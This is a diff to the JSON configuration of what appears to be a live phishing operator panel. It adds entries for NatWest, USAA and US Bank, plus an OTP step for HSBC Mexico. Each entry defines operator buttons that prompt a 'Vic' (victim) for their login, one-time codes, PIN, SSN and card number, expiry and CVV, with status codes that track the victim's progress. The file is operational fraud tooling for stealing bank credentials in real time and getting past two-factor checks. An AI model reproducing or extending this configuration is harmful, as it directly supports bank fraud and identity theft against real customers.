@@ -113,6 +113,10 @@
       "id": "nab"
     },
     {
+      "name": "Natwest",
+      "id": "natwest"
+    },
+    {
       "name": "NS",
       "id": "nsi"
     },
@@ -191,6 +195,14 @@
     {
       "name": "UB-IB",
       "id": "ubankOne"
+    },
+    {
+      "name": "USAA",
+      "id": "usaa"
+    },
+    {
+      "name": "US Bank",
+      "id": "usbank"
     },
     {
       "name": "KuCoin",
@@ -366,6 +378,89 @@
       }
     ]
   },
+  "natwest": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK PIN & PASSWORD",
+        "status": "2",
+        "inputs": [
+          {
+            "id": "pinIndex",
+            "placeholder": "Pin Index (e.g 1-2-3)"
+          },
+          {
+            "id": "passwordIndex",
+            "placeholder": "Password Index (e.g 1-2-3)"
+          }
+        ]
+      },
+      {
+        "name": "ASK OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting Pin and Password"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted Pin and Password"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "PIN",
+        "key": "pin"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
   "hsbcmx": {
     "buttons": [
       {
@@ -508,6 +603,10 @@
         "status": "2"
       },
       {
+        "name": "ASK OTP",
+        "status": "12"
+      },
+      {
         "name": "ASK SECURITY QUESTION",
         "status": "4",
         "inputs": [
@@ -584,6 +683,10 @@
       {
         "status": 11,
         "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Submitting OTP (will show as Key)"
       }
     ],
     "information": [
@@ -5526,6 +5629,240 @@
       {
         "heading": "Email OTP",
         "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "usbank": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "ASK SSN",
+        "status": "6"
+      },
+      {
+        "name": "ASK PIN",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting SSN"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted SSN"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting PIN"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted PIN"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "SSN",
+        "key": "ssn"
+      },
+      {
+        "heading": "PIN",
+        "key": "pin"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "usaa": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "ASK SSN",
+        "status": "6"
+      },
+      {
+        "name": "ASK PIN",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting SSN"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted SSN"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting PIN"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted PIN"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "SSN",
+        "key": "ssn"
+      },
+      {
+        "heading": "PIN",
+        "key": "pin"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
       }
     ],
     "mainInfo": [
